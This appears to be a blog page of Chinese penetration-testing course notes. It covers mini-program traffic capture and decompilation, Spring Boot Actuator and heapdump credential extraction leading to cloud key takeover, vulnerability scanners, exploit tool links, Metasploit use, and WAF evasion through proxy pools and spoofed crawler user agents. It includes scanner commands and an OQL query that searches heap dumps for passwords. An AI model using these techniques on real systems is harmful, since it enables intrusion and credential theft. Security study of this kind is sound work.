+<h4 id="核心点：-3"><a href="#核心点：-3" class="headerlink" title="核心点："></a>核心点：</h4><p>1、内在点资产提取&amp;版本&amp;信息等<br>2、抓包点-反代理8反证书8协议等<br>3、逆向点-反编译8脱壳8重打包等<br>4、安全点资产&amp;接口&amp;漏洞&amp;审计等</p>
+<h3 id="演示案例：-41"><a href="#演示案例：-41" class="headerlink" title="演示案例："></a>演示案例：</h3><p>APP&amp;APK-信息资源文件提取<br>微信小程序-真机&amp;模拟器数据抓包<br>微信小程序-PC&amp;模拟器分包反编译</p>
+<h4 id="APP-APK-信息资源文件提取"><a href="#APP-APK-信息资源文件提取" class="headerlink" title="APP&amp;APK-信息资源文件提取"></a>APP&amp;APK-信息资源文件提取</h4><p>APK Messenger–是本信愿&amp;资源文件&amp;开启权限等</p>
+<h4 id="微信小程序真机-模拟器数据抓包"><a href="#微信小程序真机-模拟器数据抓包" class="headerlink" title="微信小程序真机&amp;模拟器数据抓包"></a>微信小程序真机&amp;模拟器数据抓包</h4><p>安卓系统抓包（微信小程序）：<br>1、安卓系统7.0以下版本，不管微信任意版本，都会信任系统提供的证书<br>2、安卓系统7.0以上版本，微信7.0以下版本，微信会信任系统提供的证书<br>3、安卓系统7.0以上版本，微信7.0以上版本，微信只信任它自己配置的证书列表<br>基于上述我们解决的方式如下：<br>1、将证书安装到系统证书中(需要r00t)<br>2、苹果手机（苹果手机不受此影响）<br>3、采用安卓系统低于7.0的横拟器<br>演示：逍遥模拟器5.1安卓系统微信小程序抓包<br>思路：模拟器代理转发到burp<br>演示：夜神模拟器多开5安卓系统微信小程序抓包<br>演示：真机IPhone-OS系统微信小程序抓包<br>条件：抓包本机需要和Iphone手机处于同一WIFI下<br>Iphonei配置wif的代理，代理设置地址写本地抓包的工具地址和端口</p>
+<p>安全点：<br>渗透角度：测试的app提供服务的服务器，网站，接口等，一旦这个有安全问题，被不法<br>分子利用，相当于APP正常服务就会受到直接的影响！<br>APK-白盒-Java代码审计<br>APK-黑盒-资产&amp;WEB&amp;IP&amp;接口等<br>小程序-白盒-Node.JS代码审计<br>小程序黑盒资产&amp;WEB&amp;P&amp;接口等<br>开发角度：测试的app里代码的设计安全，采用没加密的发送数据，采用权限过高的设置<br>导致攻击者利用app获取到手机的敏感信息等。<br>弱加密，逻辑安全，授权，中间人等</p>
+<h4 id="微信小程序-PC-模拟器分包反编译"><a href="#微信小程序-PC-模拟器分包反编译" class="headerlink" title="微信小程序-PC&amp;模拟器分包反编译"></a>微信小程序-PC&amp;模拟器分包反编译</h4><p>1、高富帅版：<br>欢迎使用多功能小程序助手工具，点击确定开始使用。<br>免责声明：不得将小程序反编泽源码程序和反编泽图片素材挪作商业或盈利用<br>使用教程地：https:<a href="http://www.kancloud.cn/ludeqi/XCXZS/2607637">www.kancloud.cn/ludeqi/XCXZS/2607637</a><br>最新版下载地址：https:xcX.siqingw.top&#x2F;xcx.zip<br>2、穷屌丝版：<br><a href="https://github.com/sanriqing/WxAppUnpacker">https://github.com/sanriqing/WxAppUnpacker</a><br>安装node.js<br><a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a><br>安装依赖：<br>npm install<br>模拟器取出wxapkg文件：<br>&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;xxxxxx&#x2F;appbrand&#x2F;pkg<br>反编译解包<br>node wuWxapkg.js -s&#x3D;…&#x2F;xxxx.wxapkg</p>
+<h1 id="第71天-APP攻防-实战拿下-Springboot未授权-HeapDump提取-OSS利用"><a href="#第71天-APP攻防-实战拿下-Springboot未授权-HeapDump提取-OSS利用" class="headerlink" title="第71天 APP攻防-实战拿下&amp;Springboot未授权&amp;HeapDump提取&amp;OSS利用"></a>第71天 APP攻防-实战拿下&amp;Springboot未授权&amp;HeapDump提取&amp;OSS利用</h1><h4 id="安全测试报告："><a href="#安全测试报告：" class="headerlink" title="安全测试报告："></a>安全测试报告：</h4><p>1、Spring Boot Actuator v.2未授权访问<br>2、Spring Boot RCE<br>3、HeapDump-信息泄漏-帐号密码等<br>select s from java.lang.String s<br>where &#x2F;pass&#x2F;.test(s.value.toString（）)</p>
+<p>-HeapDump:分析：            ———-忽然想起来之前遇到渗透靶场里面也考了这个知识点，就是在泄露的信息中找的到flag。<br>JVisualVM MAT heapdump_tool等<br>JVisualVM:jdk自带<br>MAT:<a href="https://www.eclipse.org/mat/downloads.php">https://www.eclipse.org/mat/downloads.php</a><br>heapdump_tool:<a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a><br>-Actuator未授权检测：<br><a href="https://github.com/rabbitmask/SB-Actuator">https://github.com/rabbitmask/SB-Actuator</a><br>-SpringBooti漏洞利用：<br><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a><br>-OSS_AccessKey利用：<br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p>
+<h4 id="录像剪辑严重这里只简单说一下思路："><a href="#录像剪辑严重这里只简单说一下思路：" class="headerlink" title="录像剪辑严重这里只简单说一下思路："></a>录像剪辑严重这里只简单说一下思路：</h4><p>APP抓包信息收集出域名发现使用webpack所以packfuzz进行扫描，<br>再把域名放到awvs进行扫描<br>–发现actuator未授权访问漏洞（进行rce测试）<br>–下载heapdump下载后分析–翻出阿里云mysql账号密码<br>–因为只能本地访问所以连接失败–继续翻heapdump文件使用heapdump_tools翻出阿里云主机key<br>–获取到阿里云主机权限</p>
+<h1 id="第72天-漏洞发现-Web框架中间件-联动-Goby-Afrog-Xray-Awvs-Vulmap"><a href="#第72天-漏洞发现-Web框架中间件-联动-Goby-Afrog-Xray-Awvs-Vulmap" class="headerlink" title="第72天 漏洞发现-Web框架中间件&amp;联动&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap"></a>第72天 漏洞发现-Web框架中间件&amp;联动&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap</h1><h4 id="知识点：-48"><a href="#知识点：-48" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Bup简单介绍&amp;使用说明<br>2、Xray简单介绍&amp;使用说明<br>3、AWWS简单介绍&amp;使用说明<br>4、Goby简单介绍&amp;使用说明<br>5、Afrog简单介绍&amp;使用说明<br>6、ulmap简单介绍&amp;使用说明<br>7、Pocassist简单介绍&amp;使用说明<br>8、掌握工具安装使用&amp;原理&amp;联动&amp;适用<br>市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！<br>具体项目：Burpsuite,Awvs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Kunyu,BP播件(HaE,ShiroScan.FastJsonScan,Log4j2Scan等)等。</p>
+<h4 id="章节点：-3"><a href="#章节点：-3" class="headerlink" title="章节点："></a>章节点：</h4><p>1、漏洞发现-Web&amp;框架层面<br>2、漏洞发现-服务&amp;中间件层面<br>2、漏洞发现-APP&amp;小程序层面<br>3、漏洞发现-PC操作系统层面</p>
+<p>Acunetix-一款商业的Web漏洞扫描程序，它可以检查Web应用程序中的漏洞，如SQL注 入、跨站脚本攻击、身份验证页上的弱口令长度等。它拥有一个操作方便的图形用户界 面，并且能够创建专业级的Wb站点安全审核报告。新版本集成了漏洞管理功能来扩展企 业全面管理、优先级和控制漏洞威胁的能力。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、网站源码采用自己开发搭建</span><br><span class="line">2、网站源码采用开源CMS搭建</span><br><span class="line"></span><br><span class="line">常规漏洞 -自己开发搭建</span><br><span class="line">常规漏洞 - 开源CMS 团队可以做这个事情 一般用工具直接找到漏洞不太现实(其他非源码漏除外)</span><br><span class="line"></span><br><span class="line">冷门 小众 国内的CMS源码 用 AWVS不适合</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Burp Suite,是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具</span><br><span class="line">设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应</span><br><span class="line">的HTTP消息、持久性、认证、代理、日志、警报。</span><br><span class="line"></span><br><span class="line">用到最多的工具感觉是，Web手必备</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>pocassist是一个Golang编写的全新开源漏洞测i试框架。实现对poc的在线编辑、管理、测<br>试。如果你不想撸代码，又想实现即0c的逻辑，又想在线对靶机快速测试，那就使用<br>pocassist吧。完全兼容xray,但又不仅仅是xTay。除了支持定义目录级漏洞poc,还支持服<br>务器级漏洞、参数级漏洞、U级漏洞以及对页面内容检测，如果以上还不满足你的需求，<br>还支持加载自定义脚本。</p>
+</blockquote>
+<blockquote>
+<p>afrog是一款性能卓越。快速稳定、PoC可定制的漏洞扫猫（挖洞）工具，PoC涉及<br>CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行<br>等多种漏洞类型，帮助网络安全从业者快速验证并及时修复漏洞。</p>
+</blockquote>
+<blockquote>
+<p>Xray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神醒，支持主动、披动多种扫描方<br>式，自备言打平台、可以灵活定义POC,功能丰富，调用简单，支持Windows &#x2F;macOs<br>几inuX多种操作系统，可以满足广大安全从业者的自动化Wb漏洞深测需求。</p>
+</blockquote>
+<blockquote>
+<p>Goby是一款新的网络安全测试工具，由赵武Zwell(Pangolin、JSky、FOFA作者)打造，<br>它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并<br>快速的从一个验证入口点，切换到横向。能通过智能自动化方式，帮助安全入门者就悉靶<br>场攻防，帮助攻防服务者、渗透人员更快的拿下目标</p>
+</blockquote>
+<blockquote>
+<p>Vulmap是一款web漏洞扫描和验证工具，可对webapps进行漏洞扫描，并且具备漏洞利用<br>功能，目前支s持的webapps包括activemq,flink,shiro,sol,struts2,tomcat,unomi,drupal,<br>elasticsearch,fastison,jenkins,nexus,weblogic,jboss,spring,thinkphp</p>
+</blockquote>
+<p>真就差不多是，工具使用大战！</p>
+<h3 id="演示案例：-42"><a href="#演示案例：-42" class="headerlink" title="演示案例："></a>演示案例：</h3><p>某APP-Web扫描-常规&amp;联动-Burp&amp;Awvs&amp;Xray<br>Vulfocus-框架扫描-特定-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist<br>某资产特征-联动扫描-综合&amp;调用-Goby&amp;Awvs&amp;Xray&amp;Vulmap</p>
+<h4 id="项目资源："><a href="#项目资源：" class="headerlink" title="项目资源："></a>项目资源：</h4><p><a href="https://www.ddosi.org/awvs14-6-log4j-rce/">https://www.ddosi.org/awvs14-6-log4j-rce/</a><br><a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br><a href="https://github.com/zan8in/afrog/releases">https://github.com/zan8in/afrog/releases</a><br><a href="https://github.com/zhzyker/vulmap/releases">https://github.com/zhzyker/vulmap/releases</a><br><a href="https://github.com/jweny/pocassist/releases">https://github.com/jweny/pocassist/releases</a><br><a href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a></p>
+<h4 id="其他特扫："><a href="#其他特扫：" class="headerlink" title="其他特扫："></a>其他特扫：</h4><p>1、GUI TOOLS V6.1by安全圈小王子-bugfixed<br>2、CMS漏洞扫描器名称支持的CMS平台<br>Droopescan<br>WordPress,Joomla,Drupal,Moodle,SilverStripe<br>CMSmap WordPress,Joomla,Drupal,Moodle<br>CMSeeK WordPress,Joomla,Drupal<br>WPXF WordPress<br>WPScan WordPress<br>WPSeku WordPress<br>WPForce WordPress<br>JoomScan Joomla<br>JoomlaVS Joomla<br>JScanner Joomla<br>Drupwn Drupal<br>Typo3Scan Typo3<br>致远OA综合利用工具<br><a href="https://github.com/Summer177/seeyon_exp">https://github.com/Summer177/seeyon_exp</a><br>seeyon exp<br>通达OA综合利用工具<br><a href="https://github.com/xinyu2428/TDOA">https://github.com/xinyu2428/TDOA</a> RCE TDOA RCE<br>蓝凌OA漏洞利用工具前台无条件RCE文件写入<br><a href="https://github.com/yuanhaiGreg/LandrayExploit">https://github.com/yuanhaiGreg/LandrayExploit</a> LandrayExploit<br>泛微OA漏洞综合利用脚本htps:&#x2F;&#x2F;github.com&#x2F;z1 un&#x2F;weaver_exp weaver_.eXp<br>锐捷网络EG易风关RCE批量安全检测<br><a href="https://github.com/Tas9er/EgGateWayGetShell">https://github.com/Tas9er/EgGateWayGetShell</a><br>EgGateWayGetShell<br>CMSmap针对流行cMS进行安全扫描的工具htps:&#x2F;&#x2F;github.com&#x2F;Dionach&#x2F;CMSmap<br>CMSmap<br>使用Go开发的WordPress漏洞扫描工具<br><a href="https://github.com/blackbinn/wprecon">https://github.com/blackbinn/wprecon</a><br>wprecon<br>一个Ruby框架，旨在帮助对VordPress系统进行渗透测试<br><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> wordpress-exploit-framework<br>WPScan WordPress安全扫描器<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a> wpscan<br>VPForce Wordpress攻击套件<a href="https://github.com/nO0">https://github.com/nO0</a> py&#x2F;WPForce<br>WPForce</p>
+<p>某APP-Web扫描-常规&amp;联动-Burp&amp;Awvs&amp;Xray<br>案例：配合联动对某APP进行安全检查评估<br>对比工具优缺点<br>-对比工具使用方法</p>
+<p>Awvs:</p>
+<p>任务添加&amp;数据头部&amp;代理模式&amp;扫描模式等<br>example:<a href="http://demo.aisec.cn/">http://demo.aisec.cn/</a></p>
+<p>Xray:</p>
+<p>主动扫描&amp;被动扫描&amp;POC资源等<br>.\xray_windows_amd64.exe webscan –basic-craller <a href="http://xx/%E2%80%93html-output">http://xx/–html-output</a> tomcat.html<br>.\xray_windows_amd64.exe webscan–listen 127.0.0.1:7777–html-output app.html<br>主动扫描的缺点:</p>
+<p>URL单点扫描&amp;数据包扫描<br>1、相互联动性解决漏扫<br>2、相互联动性解决URL未探针<br>手工触发URL数据包&amp;扫描器爬虫规则探针<br>Burp&amp;Xray联动<br>1、Burp设置转发代理<br>2、Xray设置被动扫描<br>AwWs&amp;Xray联动<br>1、AWWS设置代理扫猫<br>2、Xray设置被动扫描<br>Awvs&amp;Burp&amp;Xray联动<br>1、AwWS设置代理扫描<br>2、Bup设置转发代理<br>3、Xray设置被动扫描</p>
+<p>Vulfocus-框架扫描-特定&amp;核心-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist<br>案例：配合vulfocus进行某服务或中间件的安全检查评估</p>
+<p>某资产特征-联动扫描-综合&amp;调用-Goby&amp;AWVS&amp;Xray&amp;Vulmap<br>案例：配合Goby&amp;Fofa插件进行某中间件的安全检查评估<br>1、下载拓展插件<br>2、设置配置插件</p>
+<p>这几节课主要讲工具的使用简单看一下 主要是实践</p>
+<h1 id="第73天-漏洞发现-操作系统服务中间件-Nuclei-Nessus-Nexpose-Goby"><a href="#第73天-漏洞发现-操作系统服务中间件-Nuclei-Nessus-Nexpose-Goby" class="headerlink" title="第73天 漏洞发现-操作系统服务中间件&amp;Nuclei&amp;Nessus.&amp;Nexpose&amp;Goby"></a>第73天 漏洞发现-操作系统服务中间件&amp;Nuclei&amp;Nessus.&amp;Nexpose&amp;Goby</h1><h4 id="知识点：-49"><a href="#知识点：-49" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Goby简单介绍&amp;使用说明<br>2.Nuclei简单介绍&amp;使用说明<br>3、Nessus简单介绍&amp;使用说明<br>4、Nexpose简单介绍&amp;使用说明<br>5、掌握工具安装使用&amp;原理&amp;联动&amp;适用<br>市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！<br>具体项目：Burpsuite,AwWs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Nexpose,BP(HaE,ShiroScan.FastJsonScan,Log4j2Scan).</p>
+<h4 id="章节点：-4"><a href="#章节点：-4" class="headerlink" title="章节点："></a>章节点：</h4><p>1、漏洞发现-Web&amp;框架层面<br>2、漏洞发现-服务&amp;中间件层面<br>2、漏洞发现-APP&amp;小程序层面<br>3、漏洞发现-PC操作系统层面</p>
+<h4 id="演示案例：-43"><a href="#演示案例：-43" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Nessus&amp;Nexposei漏扫操作系统漏洞<br>Goby&amp;Nuclei漏扫系统&amp;服务&amp;中间件漏洞<br>Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞<br>FofaMAP&amp;Nuclei漏扫自动化特定项目漏洞</p>
+<h4 id="项目资源：-1"><a href="#项目资源：-1" class="headerlink" title="项目资源："></a>项目资源：</h4><p>Goby:<a href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a><br>Nuclei:<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a><br>Nessus:<a href="https://mp.weixin.qq.com/s/G-7Yu8sefH3Bm3GRtUo2EA">https://mp.weixin.qq.com/s/G-7Yu8sefH3Bm3GRtUo2EA</a><br>Nexpose:<a href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a><br>FofaMAP:<a href="https://github.com/asaotomo/FofaMap">https://github.com/asaotomo/FofaMap</a></p>
+<h4 id="案例1-Nessus-Nexpose漏扫操作系统漏洞"><a href="#案例1-Nessus-Nexpose漏扫操作系统漏洞" class="headerlink" title="案例1-Nessus&amp;Nexpose漏扫操作系统漏洞"></a>案例1-Nessus&amp;Nexpose漏扫操作系统漏洞</h4><p>安装使用</p>
+<h4 id="案例2-Goby-Nucle漏扫系统-服务-中间件漏洞"><a href="#案例2-Goby-Nucle漏扫系统-服务-中间件漏洞" class="headerlink" title="案例2-Goby&amp;Nucle漏扫系统&amp;服务&amp;中间件漏洞"></a>案例2-Goby&amp;Nucle漏扫系统&amp;服务&amp;中间件漏洞</h4><p>goby图形化界面<br>nuclei 可以自定义检测脚本<br>Nuclei -u <a href="http://xxxxxxxx/">http://xxxxxxxx</a></p>
+<h4 id="案例3-Nuclei漏扫特定资产-模版导入-最新漏洞"><a href="#案例3-Nuclei漏扫特定资产-模版导入-最新漏洞" class="headerlink" title="案例3-Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞"></a>案例3-Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞</h4><p>例子：CVE-2022-30525:ZyXl防火墙远程命令注入漏洞<br>FofaViewer:title&#x3D;&#x3D;“USG FLEX 50(USG20-VPN)”<br>nuclei.exe -t Zyxel.yaml -I z.txt<br>Zyxel.yaml<br>id:CVE-2022-30525</p>
+<h4 id="案例4-FofaMAP户-Nucle漏扫自动化特定资产漏洞"><a href="#案例4-FofaMAP户-Nucle漏扫自动化特定资产漏洞" class="headerlink" title="案例4-FofaMAP户&amp;Nucle漏扫自动化特定资产漏洞"></a>案例4-FofaMAP户&amp;Nucle漏扫自动化特定资产漏洞</h4><h1 id="第74天-漏洞发现-Web框架中间件插件-BurpSuite-浏览器-被动-主动探针"><a href="#第74天-漏洞发现-Web框架中间件插件-BurpSuite-浏览器-被动-主动探针" class="headerlink" title="第74天 漏洞发现-Web框架中间件插件&amp;BurpSuite&amp;浏览器&amp;被动&amp;主动探针"></a>第74天 漏洞发现-Web框架中间件插件&amp;BurpSuite&amp;浏览器&amp;被动&amp;主动探针</h1><p>最近几天都是演示工具如何使用如：<a href="https://so.csdn.net/so/search?q=AWVS&spm=1001.2101.3001.7020">AWVS</a>、Nessus、nexpose等综合性利用工具。<br>Burp插件和漏扫工具的区别</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标：</span><br><span class="line">1、用其他的工具项目去检测漏洞</span><br><span class="line"></span><br><span class="line">2、用Burpsuite抓包后带入插件检测</span><br><span class="line">有部分目标需要特定的数据包访问的</span><br><span class="line"></span><br><span class="line">1、登录状态和未登录状态</span><br><span class="line">2、不同目标访问的数据包的不同</span><br></pre></td></tr></table></figure>
+
+<h4 id="知识点：-50"><a href="#知识点：-50" class="headerlink" title="知识点："></a>知识点：</h4><p>1、浏览器插件&amp;BurpSuite插件<br>2、Hack-Tools&amp;pentestkit&amp;fofa view等<br>3、Fiora&amp;Spring&amp;Fastison&amp;Shiro&amp;Log4等<br>市面上有很多漏扫系统工具蜘本，课程讲到的基本都是目前主流推荐的优秀项目！<br>具体项目：Burpsuite,Awvs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Nexpose,BP(HaE,ShiroScan.FastJsonScan,Log4j2Scan).</p>
+<h4 id="章节点：-5"><a href="#章节点：-5" class="headerlink" title="章节点："></a>章节点：</h4><p>1、漏洞发现-Web&amp;框架层面<br>2、漏洞发现服务&amp;中间件层面<br>3、漏洞发现-APP&amp;小程序层面<br>4、漏洞发现PC操作系统层面</p>
+<h4 id="演示案例：-44"><a href="#演示案例：-44" class="headerlink" title="演示案例："></a>演示案例：</h4><p>浏览器插件-辅助&amp;资产&amp;漏洞库-Hack-Tools&amp;Fofa view&amp;Pentestkit<br>BurpSuite插件-被动&amp;特定扫描-Fiora&amp;Spring&amp;Fastison&amp;Shiro&amp;Log4j</p>
+<p>浏览器插件-辅助&amp;资产&amp;漏洞库-Hack.Tools&amp;Fofa view&amp;Pentestkit<br>资产：<a href="https://github.com/fofapro/fofa_view">https://github.com/fofapro/fofa_view</a><br>信息收集 需要fofa为登录状态</p>
+<p>辅助：<a href="https://github.com/LasCc/Hack-Tools">https://github.com/LasCc/Hack-Tools</a><br>工具箱包含有 反弹shell、系统命令、文件包含语句等</p>
+<p>漏洞库：<a href="https://github.com/DenisPodgurskii/pentestkit">https://github.com/DenisPodgurskii/pentestkit</a><br>信息收集、漏洞探测、waf识别</p>
+<p>BurpSuite插件-被动&amp;特定扫描-Fiora&amp;Spring&amp;Fastjson&amp;Shiro&amp;Log4</p>
+<p><a href="https://github.com/bit4woo/Fiora">https://github.com/bit4woo/Fiora</a><br>功能：联动nuclei进行单个或多个poc测试</p>
+<p><a href="https://github.com/metaStor/SpringScan">https://github.com/metaStor/SpringScan</a><br>SpringScan 漏洞检测 Burp插件<br><a href="https://github.com/Maskhe/FastjsonScan">https://github.com/Maskhe/FastjsonScan</a></p>
+<p><a href="https://github.com/bigsizeme/Log4j-check">https://github.com/bigsizeme/Log4j-check</a><br>被动lg4j扫描 支持RC1绕过 log4J burp被扫插件、CVE-2021-44228、支持RC1绕过、支持json数据类型、支持dnslog.cn和burp内置DNS、可配合JNDIExploit生成payload</p>
+<p><a href="https://github.com/projectdiscovery/nuclei-burp-plugin">https://github.com/projectdiscovery/nuclei-burp-plugin</a></p>
+<p>这节主要讲的大部分都是对相关工具的使用。</p>
+<h1 id="第75天-漏洞利用-MSF框架-CVE-CNVD-POC-EXP监控-查找-整理"><a href="#第75天-漏洞利用-MSF框架-CVE-CNVD-POC-EXP监控-查找-整理" class="headerlink" title="第75天 漏洞利用-MSF框架&amp;CVE&amp;CNVD&amp;POC&amp;EXP监控&amp;查找&amp;整理"></a>第75天 漏洞利用-MSF框架&amp;CVE&amp;CNVD&amp;POC&amp;EXP监控&amp;查找&amp;整理</h1><h4 id="知识点：-51"><a href="#知识点：-51" class="headerlink" title="知识点："></a>知识点：</h4><p>1、MSF-漏洞利用框架使用<br>2、库查找CVE&amp;CNVD&amp;关键字<br>3、库整理-CVE&amp;CNVD漏洞详情<br>4、新漏洞-框架或其他未集成利用<br>集成和未集成漏洞的利用思路，漏洞利用条件等。</p>
+<p>漏洞发现后，一般会有那些关于漏洞的常见说明信息：<br>1、漏洞对象<br>2、漏洞编号<br>3、漏洞类型</p>
+<h4 id="漏洞资源："><a href="#漏洞资源：" class="headerlink" title="漏洞资源："></a>漏洞资源：</h4><p>today-cve<br><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a><br>cve官网<br><a href="https://cve.mitre.org/">https://cve.mitre.org/</a><br>国家信息安全漏洞共享平台<br><a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a><br>国家信息安全漏洞库<br><a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></p>
+<h4 id="演示案例：-45"><a href="#演示案例：-45" class="headerlink" title="演示案例："></a>演示案例：</h4><p>漏洞利用整理库-PocOrExp&amp;CVE-CNVD<br>漏洞利用-查找库-SearchSploit&amp;PoC-in-GitHub<br>漏洞利用-模块框架-MetaSploit-.Framework(MSF)<br>漏洞利用-杂乱工具-特定图像化渗透武器库(6.1)</p>
+<p>漏同利用-整理库-PocOrExp&amp;CVE-CNVD<br><a href="https://github.com/ttonys/Scrapy-CVE-CNVD">https://github.com/ttonys/Scrapy-CVE-CNVD</a><br><a href="https://github.com/ycdxsb/PocOrExp">https://github.com/ycdxsb/PocOrExp</a> in Github</p>
+<p>漏同利用-查找库-SearchSploit&amp;PoC-in-GitHub<br><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a><br><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p>
+<p>漏洞利用-模块框架-MetaSploit-Framework(MSF)</p>
+<blockquote>
+<p>利用查找：</p>
+<p>基于三个信息：</p>
+<p>1、漏洞信息</p>
+<p>2、漏洞编号</p>
+<p>3、漏洞对象</p>
+<p>利用漏洞：<br>MSF漏洞利用框架</p>
+<p>集成大部分的安全漏洞利用模块，直接利用MSF对漏洞进行利用</p>
+<p>但是不代表所有漏洞都有集成，漏洞类型或漏洞影响等原因造成未集成</p>
+<p>1、最新漏洞</p>
+<p>2、漏洞复现复杂</p>
+<p>3、漏洞影响过小</p>
+</blockquote>
+<p><a href="https://www.metasploit.com/">https://www.metasploit.com/</a><br>安装下载<br><a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html</a><br>简单使用：<br><a href="https://blog.csdn.net/weixin_42380348/article/details/123549631">https://blog.csdn.net/weixin_42380348/article/details/123549631</a></p>
+<p>漏同利用-杂周工具特定图像化渗透武器库(V6.1)<br><a href="https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q">https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q</a></p>
+<h1 id="第76天-WAF攻防-信息收集-识别-被动探针-代理池-仿指纹-白名单"><a href="#第76天-WAF攻防-信息收集-识别-被动探针-代理池-仿指纹-白名单" class="headerlink" title="第76天 WAF攻防-信息收集&amp;识别&amp;被动探针&amp;代理池&amp;仿指纹&amp;白名单"></a>第76天 WAF攻防-信息收集&amp;识别&amp;被动探针&amp;代理池&amp;仿指纹&amp;白名单</h1><h3 id="知识点：-52"><a href="#知识点：-52" class="headerlink" title="知识点："></a>知识点：</h3><p>1、WAF介绍&amp;模式&amp;识别&amp;防护等<br>2、信息收集被动扫描&amp;第三方接口<br>3、信息收集基于<a href="https://so.csdn.net/so/search?q=%E7%88%AC%E8%99%AB&spm=1001.2101.3001.7020">爬虫</a>&amp;文件目录探针<br>4、信息收集基于用户&amp;代理池&amp;白名单</p>
+<h4 id="章节点：-6"><a href="#章节点：-6" class="headerlink" title="章节点："></a>章节点：</h4><p>WF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段，</p>
+<p>补充点：<br>1、什么是WAF?<br>Web Application Firewall(web应用防火墙)，一种公认的说法是web应用防火墙通过执<br>行一系列针对HTTP&#x2F;HTTPS的安全策路来专门为web应用提供保护的一款产品。<br>基本可以分为以下4种<br>软件型WAF<br>以软件的形式安装在服务器上面，可以接触到服务器上的文件，因此就可以检服务器上<br>是否有webshell,是否有文件被创建等。<br>硬件型WAF<br>以硬件形式部署在链路中，支持多种部暑方式。当串联到链路上时可以拦截恶意流量，在<br>旁路监听模式时只记录攻击但是不进行拦截，<br>云WAF<br>一般以反向代理的形式工作，通过配置后，使对网贴的请求数据优先经过WAF主机，在<br>WAF主机对数据进行过滤后再传给服务器<br>网站内置的WAF<br>就是来自网站内部的过滤，直接出现在网站代码中，比如说对输入的参数强制类转换啊，<br>对输入的参数进行教感词检汉则阿 什么的</p>
+<h4 id="演示案例：-46"><a href="#演示案例：-46" class="headerlink" title="演示案例："></a>演示案例：</h4><p>信息收集被动扫描黑暗擎&amp;三方接口<br>信息收集目录扫描-Python代理加载脚本<br>信息收集-工具扫描-Awvs&amp;Xray&amp;Goby内置</p>
+<p>信息收集常见检测：<br>1、脚本或工具速度流量快<br>2、脚本或工具的指纹被识别<br>3、脚本或工具的检测Payload</p>
+<p>信息收集常见方法：<br>1、延迟：解决请求过快封IP的情况<br>2、代理池：在确保速度的情况下解决请求过快封P的拦截<br>3、白名单：模拟白名单模拟WAF授权测试，解决速度及测试拦截<br>4、模拟用户：模拟真实用户数据包请求探针，解决WAF指纹识别</p>
+<p>延迟设置扫描间隔</p>
+<p>代理池使用proxifier代理</p>
+<p>案例：安全狗存在UA白名单，即设置为百度或360爬虫的UA头有概率绕过封禁</p>
+<p>信息收集被动扫描黑暗弱引擎&amp;三方接口<br>黑暗引擎：Fofa Quake Shodan zoomeye0.zone等<br>其他接口：htps:&#x2F;forum.ywhack.com&#x2F;bountytips.php?getinfo</p>
+<p>信息收集目录扫描Python代理加载脚本<br>import requests<br>import time</p>
+<p>xray设置代理 修改配置文件 或者使用proxifier代理软件</p>
+<p>goby设置代理</p>
